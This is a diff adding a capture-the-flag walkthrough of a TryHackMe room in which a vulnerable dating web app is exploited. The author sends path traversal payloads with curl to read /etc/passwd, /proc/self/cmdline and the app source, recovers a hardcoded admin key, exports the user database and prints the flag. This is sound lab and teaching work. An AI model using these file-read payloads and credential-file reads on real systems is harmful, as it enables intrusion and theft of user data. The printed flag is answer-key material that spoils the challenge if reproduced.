@@ -1,1 +1,112 @@
 # Valenfind tryhackme walkthrough
+
+https://tryhackme.com/room/lafb2026e10
+
+
+
+Initial reconnace
+as the lab already gave us the web link and web page is running on port 5000 let take a look
+<img width="1891" height="531" alt="image" src="https://github.com/user-attachments/assets/e92b772a-f438-4054-840f-85444f2b5ab9" />
+
+as i click on start journey it ask to create an account so i register here
+<img width="1898" height="495" alt="image" src="https://github.com/user-attachments/assets/f1b5c8c2-8c50-4753-8fd3-814fab7a112a" />
+
+as i register i got to dashboard where i can see some profiles created
+<img width="1891" height="967" alt="image" src="https://github.com/user-attachments/assets/bc7329d3-2679-4e11-84b9-583461a73b34" />
+
+so we can like a person and view there profile and chnage profile bio theme
+
+<img width="1917" height="745" alt="image" src="https://github.com/user-attachments/assets/72810aa9-4914-4604-9fa4-af9675d920b3" />
+
+at first look everthing seem normal as i send valantine by clicking on button i dont see any url changes so i open the inspect and network and when i chnage the theem i notic get requret 
+```
+http://10.48.151.100:5000/api/fetch_layout?layout=theme_classic.html
+```
+<img width="1915" height="967" alt="image" src="https://github.com/user-attachments/assets/2d148320-a341-46a8-93e8-11adbdedefe8" />
+
+the api is try to fetch the layout so i try lfi sent this API request of sent path traversal payloads.
+
+First test was `/etc/passwd` with: `../../../../etc/passwd` with curl on terminal so i think it dosnt req session cookei as it vibe coded and im true 
+it return me what i want 
+```
+curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../etc/passwd
+```
+
+<img width="933" height="862" alt="image" src="https://github.com/user-attachments/assets/cc0955c8-4b16-4622-bc4e-cc515641f5c0" />
+Use /proc/self/cmdline to Find the App's Location
+You have arbitrary file read, but you don’t know where the web application’s source code lives on the server. Here’s a Linux trick that solves that instantly.
+
+Write on Medium
+The /proc filesystem is a virtual filesystem that exposes live information about running processes. /proc/self refers to the current process — in this case, the Python web server serving your requests. Inside it, cmdline contains the exact command used to launch the process.
+
+```
+$ curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../proc/self/cmdline -O 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    39  100    39    0     0    598      0 --:--:-- --:--:-- --:--:--   600
+death@esther:~$ cat fetch_layout 
+/usr/bin/python3/opt/Valenfind/app.py
+```
+we can do same things on burp if u prefer burp
+
+<img width="1222" height="277" alt="image" src="https://github.com/user-attachments/assets/78751324-cd19-4c61-b504-feff06f16f9c" />
+
+Why this matters: You’re asking the server “how were you started?” and it answers honestly, giving you the full path to the application’s entry point. Now you have a precise target for your next read.
+
+The app lives at /opt/Valenfind/app.py.
+```
+curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py
+```
+
+<img width="1086" height="562" alt="image" src="https://github.com/user-attachments/assets/ddbb9ed6-1c5b-4c1a-ac9a-41103fba7eb7" />
+
+<img width="1521" height="530" alt="image" src="https://github.com/user-attachments/assets/a1efa4d3-7acd-416a-93bb-599a7dacc48b" />
+
+The server returns the complete Python source code. Read it carefully. Near the top:
+```
+ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
+DATABASE      = 'cupid.db'
+```
+Hardcoded. Right there. And further down, the admin export endpoint:
+```
+@app.route('/api/admin/export_db')
+def export_db():
+    auth_header = request.headers.get('X-Valentine-Token')
+    if auth_header == ADMIN_API_KEY:
+        try:
+            return send_file(DATABASE, as_attachment=True,
+                             download_name='valenfind_leak.db')
+        except Exception as e:
+            return str(e)
+    else:
+        return jsonify({"error": "Forbidden",
+                        "message": "Missing or Invalid Admin Token"}), 403
+```
+<img width="974" height="267" alt="image" src="https://github.com/user-attachments/assets/ad7225f9-dae5-437a-9aab-c79bcb25a74b" />
+
+There’s an endpoint at /api/admin/export_db that downloads the entire database — but only if you send the correct X-Valentine-Token header. You now have exactly that token.
+
+The real-world lesson: Hardcoding secrets in source code is a critical vulnerability. Once an attacker can read your code (via LFI, exposed repos, or misconfigured servers), all your internal secrets are exposed. Always use environment variables or a secrets manager.
+
+## Download the Database and Extract the Flag
+Use curl to call the export endpoint with the admin token:
+
+```
+curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
+     http://MACHINE_IP:5000/api/admin/export_db \
+     -o valenfind.db
+```
+Open it with sqlite3:
+```
+sqlite3 valenfind.db
+sqlite> .tables
+users
+sqlite> SELECT * FROM users;
+```
+
+<img width="1905" height="576" alt="image" src="https://github.com/user-attachments/assets/23cea032-7ad3-4d48-986d-adcd0c9805b6" />
+
+Flag
+```
+THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
+```
